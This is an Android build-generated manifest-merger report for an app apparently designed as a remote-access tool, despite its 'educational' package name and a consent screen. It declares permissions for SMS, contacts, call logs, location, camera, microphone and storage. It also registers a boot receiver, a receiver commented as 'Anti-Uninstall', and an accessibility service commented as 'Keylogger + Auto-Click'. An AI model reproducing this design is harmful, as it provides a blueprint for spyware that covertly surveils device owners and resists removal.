app/build/intermediates/manifest_merge_blame_file/release/manifest-merger-blame-release-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.remoteaccess.educational"
4    android:versionCode="1"
5    android:versionName="1.0.0" >
6
7    <uses-sdk
8        android:minSdkVersion="24"
9        android:targetSdkVersion="34" />
10
11    <!-- ========== REQUIRED PERMISSIONS ========== -->
12    <uses-permission android:name="android.permission.INTERNET" />
12-->src/main/AndroidManifest.xml:5:5-67
12-->src/main/AndroidManifest.xml:5:22-64
13    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
13-->src/main/AndroidManifest.xml:6:5-79
13-->src/main/AndroidManifest.xml:6:22-76
14    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
14-->src/main/AndroidManifest.xml:7:5-77
14-->src/main/AndroidManifest.xml:7:22-74
15    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
15-->src/main/AndroidManifest.xml:8:5-81
15-->src/main/AndroidManifest.xml:8:22-78
16
17    <!-- ========== OPTIONAL PERMISSIONS ========== -->
18
19
20    <!-- SMS Features -->
21    <uses-permission android:name="android.permission.READ_SMS" />
21-->src/main/AndroidManifest.xml:13:5-67
21-->src/main/AndroidManifest.xml:13:22-64
22    <uses-permission android:name="android.permission.SEND_SMS" />
22-->src/main/AndroidManifest.xml:14:5-67
22-->src/main/AndroidManifest.xml:14:22-64
23    <uses-permission android:name="android.permission.RECEIVE_SMS" />
23-->src/main/AndroidManifest.xml:15:5-70
23-->src/main/AndroidManifest.xml:15:22-67
24
25    <!-- Contacts -->
26    <uses-permission android:name="android.permission.READ_CONTACTS" />
26-->src/main/AndroidManifest.xml:18:5-72
26-->src/main/AndroidManifest.xml:18:22-69
27
28    <!-- Call Logs -->
29    <uses-permission android:name="android.permission.READ_CALL_LOG" />
29-->src/main/AndroidManifest.xml:21:5-72
29-->src/main/AndroidManifest.xml:21:22-69
30
31    <!-- Location -->
32    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
32-->src/main/AndroidManifest.xml:24:5-79
32-->src/main/AndroidManifest.xml:24:22-76
33    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
33-->src/main/AndroidManifest.xml:25:5-81
33-->src/main/AndroidManifest.xml:25:22-78
34
35    <!-- Camera & Microphone -->
36    <uses-permission android:name="android.permission.CAMERA" />
36-->src/main/AndroidManifest.xml:28:5-65
36-->src/main/AndroidManifest.xml:28:22-62
37    <uses-permission android:name="android.permission.RECORD_AUDIO" />
37-->src/main/AndroidManifest.xml:29:5-71
37-->src/main/AndroidManifest.xml:29:22-68
38
39    <!-- Storage -->
40    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
40-->src/main/AndroidManifest.xml:32:5-80
40-->src/main/AndroidManifest.xml:32:22-77
41    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
41-->src/main/AndroidManifest.xml:33:5-81
41-->src/main/AndroidManifest.xml:33:22-78
42
43    <!-- Vibration -->
44    <uses-permission android:name="android.permission.VIBRATE" />
44-->src/main/AndroidManifest.xml:36:5-66
44-->src/main/AndroidManifest.xml:36:22-63
45
46    <!-- WiFi -->
47    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
47-->src/main/AndroidManifest.xml:39:5-76
47-->src/main/AndroidManifest.xml:39:22-73
48    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
48-->src/main/AndroidManifest.xml:40:5-76
48-->src/main/AndroidManifest.xml:40:22-73
49    <uses-permission android:name="android.permission.WAKE_LOCK" />
49-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:23:5-68
49-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:23:22-65
50
51    <permission
51-->[androidx.core:core:1.9.0] AndroidManifest.xml:22:5-24:47
52        android:name="com.remoteaccess.educational.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
52-->[androidx.core:core:1.9.0] AndroidManifest.xml:23:9-81
53        android:protectionLevel="signature" />
53-->[androidx.core:core:1.9.0] AndroidManifest.xml:24:9-44
54
55    <uses-permission android:name="com.remoteaccess.educational.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
55-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:5-97
55-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:22-94
56
57    <application
57-->src/main/AndroidManifest.xml:42:5-106:19
58        android:name="com.remoteaccess.educational.MyApplication"
58-->src/main/AndroidManifest.xml:43:9-38
59        android:allowBackup="true"
59-->src/main/AndroidManifest.xml:44:9-35
60        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
60-->[androidx.core:core:1.9.0] AndroidManifest.xml:28:18-86
61        android:extractNativeLibs="false"
62        android:icon="@mipmap/ic_launcher"
62-->src/main/AndroidManifest.xml:45:9-43
63        android:label="@string/app_name"
63-->src/main/AndroidManifest.xml:46:9-41
64        android:theme="@style/AppTheme" >
64-->src/main/AndroidManifest.xml:47:9-40
65
66        <!-- Main Activity -->
67        <activity
67-->src/main/AndroidManifest.xml:50:9-57:20
68            android:name="com.remoteaccess.educational.MainActivity"
68-->src/main/AndroidManifest.xml:51:13-41
69            android:exported="true" >
69-->src/main/AndroidManifest.xml:52:13-36
70            <intent-filter>
70-->src/main/AndroidManifest.xml:53:13-56:29
71                <action android:name="android.intent.action.MAIN" />
71-->src/main/AndroidManifest.xml:54:17-69
71-->src/main/AndroidManifest.xml:54:25-66
72
73                <category android:name="android.intent.category.LAUNCHER" />
73-->src/main/AndroidManifest.xml:55:17-77
73-->src/main/AndroidManifest.xml:55:27-74
74            </intent-filter>
75        </activity>
76
77        <!-- Consent Activity -->
78        <activity
78-->src/main/AndroidManifest.xml:60:9-62:40
79            android:name="com.remoteaccess.educational.ConsentActivity"
79-->src/main/AndroidManifest.xml:61:13-44
80            android:exported="false" />
80-->src/main/AndroidManifest.xml:62:13-37
81
82        <!-- Background Service -->
83        <service
83-->src/main/AndroidManifest.xml:65:9-69:56
84            android:name="com.remoteaccess.educational.services.RemoteAccessService"
84-->src/main/AndroidManifest.xml:66:13-57
85            android:enabled="true"
85-->src/main/AndroidManifest.xml:67:13-35
86            android:exported="false"
86-->src/main/AndroidManifest.xml:68:13-37
87            android:foregroundServiceType="dataSync" />
87-->src/main/AndroidManifest.xml:69:13-53
88
89        <!-- Boot Receiver -->
90        <receiver
90-->src/main/AndroidManifest.xml:72:9-79:20
91            android:name="com.remoteaccess.educational.receivers.BootReceiver"
91-->src/main/AndroidManifest.xml:73:13-51
92            android:enabled="true"
92-->src/main/AndroidManifest.xml:74:13-35
93            android:exported="true" >
93-->src/main/AndroidManifest.xml:75:13-36
94            <intent-filter>
94-->src/main/AndroidManifest.xml:76:13-78:29
95                <action android:name="android.intent.action.BOOT_COMPLETED" />
95-->src/main/AndroidManifest.xml:77:17-79
95-->src/main/AndroidManifest.xml:77:25-76
96            </intent-filter>
97        </receiver>
98
99        <!-- Package Change Receiver (Anti-Uninstall) -->
100        <receiver
100-->src/main/AndroidManifest.xml:82:9-91:20
101            android:name="com.remoteaccess.educational.receivers.PackageChangeReceiver"
101-->src/main/AndroidManifest.xml:83:13-60
102            android:enabled="true"
102-->src/main/AndroidManifest.xml:84:13-35
103            android:exported="true" >
103-->src/main/AndroidManifest.xml:85:13-36
104            <intent-filter>
104-->src/main/AndroidManifest.xml:86:13-90:29
105                <action android:name="android.intent.action.BOOT_COMPLETED" />
105-->src/main/AndroidManifest.xml:77:17-79
105-->src/main/AndroidManifest.xml:77:25-76
106                <action android:name="android.intent.action.PACKAGE_REMOVED" />
106-->src/main/AndroidManifest.xml:88:17-80
106-->src/main/AndroidManifest.xml:88:25-77
107                <action android:name="android.intent.action.PACKAGE_FULLY_REMOVED" />
107-->src/main/AndroidManifest.xml:89:17-86
107-->src/main/AndroidManifest.xml:89:25-83
108            </intent-filter>
109        </receiver>
110
111        <!-- Combined Accessibility Service (Keylogger + Auto-Click) -->
112        <service
112-->src/main/AndroidManifest.xml:94:9-104:19
113            android:name="com.remoteaccess.educational.permissions.AccessibilityHelperService"
113-->src/main/AndroidManifest.xml:95:13-67
114            android:exported="true"
114-->src/main/AndroidManifest.xml:97:13-36
115            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
115-->src/main/AndroidManifest.xml:96:13-79
116            <intent-filter>
116-->src/main/AndroidManifest.xml:98:13-100:29
117                <action android:name="android.accessibilityservice.AccessibilityService" />
117-->src/main/AndroidManifest.xml:99:17-92
117-->src/main/AndroidManifest.xml:99:25-89
118            </intent-filter>
119
120            <meta-data
120-->src/main/AndroidManifest.xml:101:13-103:72
121                android:name="android.accessibilityservice"
121-->src/main/AndroidManifest.xml:102:17-60
122                android:resource="@xml/accessibility_service_config" />
122-->src/main/AndroidManifest.xml:103:17-69
123        </service>
124
125        <activity
125-->[com.karumi:dexter:6.2.3] AndroidManifest.xml:27:9-29:72
126            android:name="com.karumi.dexter.DexterActivity"
126-->[com.karumi:dexter:6.2.3] AndroidManifest.xml:28:13-60
127            android:theme="@style/Dexter.Internal.Theme.Transparent" />
127-->[com.karumi:dexter:6.2.3] AndroidManifest.xml:29:13-69
128
129        <provider
129-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:29:9-37:20
130            android:name="androidx.startup.InitializationProvider"
130-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:30:13-67
131            android:authorities="com.remoteaccess.educational.androidx-startup"
131-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:31:13-68
132            android:exported="false" >
132-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:32:13-37
133            <meta-data
133-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:34:13-36:52
134                android:name="androidx.work.WorkManagerInitializer"
134-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:35:17-68
135                android:value="androidx.startup" />
135-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:36:17-49
136            <meta-data
136-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:29:13-31:52
137                android:name="androidx.emoji2.text.EmojiCompatInitializer"
137-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:30:17-75
138                android:value="androidx.startup" />
138-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:31:17-49
139            <meta-data
139-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:29:13-31:52
140                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
140-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:30:17-78
141                android:value="androidx.startup" />
141-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:31:17-49
142            <meta-data
142-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:29:13-31:52
143                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
143-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:30:17-85
144                android:value="androidx.startup" />
144-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:31:17-49
145        </provider>
146
147        <service
147-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:39:9-45:35
148            android:name="androidx.work.impl.background.systemalarm.SystemAlarmService"
148-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:40:13-88
149            android:directBootAware="false"
149-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:41:13-44
150            android:enabled="@bool/enable_system_alarm_service_default"
150-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:42:13-72
151            android:exported="false" />
151-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:43:13-37
152        <service
152-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:46:9-52:35
153            android:name="androidx.work.impl.background.systemjob.SystemJobService"
153-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:47:13-84
154            android:directBootAware="false"
154-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:48:13-44
155            android:enabled="@bool/enable_system_job_service_default"
155-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:49:13-70
156            android:exported="true"
156-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:50:13-36
157            android:permission="android.permission.BIND_JOB_SERVICE" />
157-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:51:13-69
158        <service
158-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:53:9-59:35
159            android:name="androidx.work.impl.foreground.SystemForegroundService"
159-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:54:13-81
160            android:directBootAware="false"
160-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:55:13-44
161            android:enabled="@bool/enable_system_foreground_service_default"
161-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:56:13-77
162            android:exported="false" />
162-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:57:13-37
163
164        <receiver
164-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:61:9-66:35
165            android:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver"
165-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:62:13-88
166            android:directBootAware="false"
166-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:63:13-44
167            android:enabled="true"
167-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:64:13-35
168            android:exported="false" />
168-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:65:13-37
169        <receiver
169-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:67:9-77:20
170            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy"
170-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:68:13-106
171            android:directBootAware="false"
171-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:69:13-44
172            android:enabled="false"
172-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:70:13-36
173            android:exported="false" >
173-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:71:13-37
174            <intent-filter>
174-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:73:13-76:29
175                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
175-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:74:17-87
175-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:74:25-84
176                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
176-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:75:17-90
176-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:75:25-87
177            </intent-filter>
178        </receiver>
179        <receiver
179-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:78:9-88:20
180            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy"
180-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:79:13-104
181            android:directBootAware="false"
181-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:80:13-44
182            android:enabled="false"
182-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:81:13-36
183            android:exported="false" >
183-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:82:13-37
184            <intent-filter>
184-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:84:13-87:29
185                <action android:name="android.intent.action.BATTERY_OKAY" />
185-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:85:17-77
185-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:85:25-74
186                <action android:name="android.intent.action.BATTERY_LOW" />
186-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:86:17-76
186-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:86:25-73
187            </intent-filter>
188        </receiver>
189        <receiver
189-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:89:9-99:20
190            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy"
190-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:90:13-104
191            android:directBootAware="false"
191-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:91:13-44
192            android:enabled="false"
192-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:92:13-36
193            android:exported="false" >
193-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:93:13-37
194            <intent-filter>
194-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:95:13-98:29
195                <action android:name="android.intent.action.DEVICE_STORAGE_LOW" />
195-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:96:17-83
195-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:96:25-80
196                <action android:name="android.intent.action.DEVICE_STORAGE_OK" />
196-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:97:17-82
196-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:97:25-79
197            </intent-filter>
198        </receiver>
199        <receiver
199-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:100:9-109:20
200            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy"
200-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:101:13-103
201            android:directBootAware="false"
201-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:102:13-44
202            android:enabled="false"
202-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:103:13-36
203            android:exported="false" >
203-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:104:13-37
204            <intent-filter>
204-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:106:13-108:29
205                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
205-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:107:17-79
205-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:107:25-76
206            </intent-filter>
207        </receiver>
208        <receiver
208-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:110:9-121:20
209            android:name="androidx.work.impl.background.systemalarm.RescheduleReceiver"
209-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:111:13-88
210            android:directBootAware="false"
210-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:112:13-44
211            android:enabled="false"
211-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:113:13-36
212            android:exported="false" >
212-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:114:13-37
213            <intent-filter>
213-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:116:13-120:29
214                <action android:name="android.intent.action.BOOT_COMPLETED" />
214-->src/main/AndroidManifest.xml:77:17-79
214-->src/main/AndroidManifest.xml:77:25-76
215                <action android:name="android.intent.action.TIME_SET" />
215-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:118:17-73
215-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:118:25-70
216                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
216-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:119:17-81
216-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:119:25-78
217            </intent-filter>
218        </receiver>
219        <receiver
219-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:122:9-131:20
220            android:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver"
220-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:123:13-99
221            android:directBootAware="false"
221-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:124:13-44
222            android:enabled="@bool/enable_system_alarm_service_default"
222-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:125:13-72
223            android:exported="false" >
223-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:126:13-37
224            <intent-filter>
224-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:128:13-130:29
225                <action android:name="androidx.work.impl.background.systemalarm.UpdateProxies" />
225-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:129:17-98
225-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:129:25-95
226            </intent-filter>
227        </receiver>
228        <receiver
228-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:132:9-142:20
229            android:name="androidx.work.impl.diagnostics.DiagnosticsReceiver"
229-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:133:13-78
230            android:directBootAware="false"
230-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:134:13-44
231            android:enabled="true"
231-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:135:13-35
232            android:exported="true"
232-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:136:13-36
233            android:permission="android.permission.DUMP" >
233-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:137:13-57
234            <intent-filter>
234-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:139:13-141:29
235                <action android:name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS" />
235-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:140:17-88
235-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:140:25-85
236            </intent-filter>
237        </receiver>
238
239        <service
239-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:24:9-28:63
240            android:name="androidx.room.MultiInstanceInvalidationService"
240-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:25:13-74
241            android:directBootAware="true"
241-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:26:13-43
242            android:exported="false" />
242-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:27:13-37
243
244        <receiver
244-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:34:9-52:20
245            android:name="androidx.profileinstaller.ProfileInstallReceiver"
245-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:35:13-76
246            android:directBootAware="false"
246-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:36:13-44
247            android:enabled="true"
247-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:37:13-35
248            android:exported="true"
248-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:38:13-36
249            android:permission="android.permission.DUMP" >
249-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:39:13-57
250            <intent-filter>
250-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:40:13-42:29
251                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE" />
251-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:41:17-91
251-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:41:25-88
252            </intent-filter>
253            <intent-filter>
253-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:43:13-45:29
254                <action android:name="androidx.profileinstaller.action.SKIP_FILE" />
254-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:44:17-85
254-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:44:25-82
255            </intent-filter>
256            <intent-filter>
256-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:46:13-48:29
257                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE" />
257-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:47:17-88
257-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:47:25-85
258            </intent-filter>
259            <intent-filter>
259-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:49:13-51:29
260                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION" />
260-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:50:17-95
260-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:50:25-92
261            </intent-filter>
262        </receiver>
263    </application>
264
265</manifest>